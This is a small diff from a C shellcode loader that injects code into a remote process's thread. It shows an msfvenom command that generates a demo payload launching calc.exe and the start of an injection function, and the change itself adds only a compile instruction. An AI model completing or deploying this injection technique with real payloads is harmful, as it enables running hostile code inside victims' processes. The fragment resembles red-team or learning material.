@@ -4,6 +4,8 @@
 // Basic shellcode loader that injects into a remote thread
 // Generate shellcode with: msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
 
+// Compile with: cl BasicShellcodeLoader.c
+
 BOOL InjectRemoteThread(DWORD pid, PBYTE pShellcode, SIZE_T shellcodeSize) {
 	SIZE_T numberOfBytesWritten = NULL;
 	DWORD dwOldProtection = NULL;
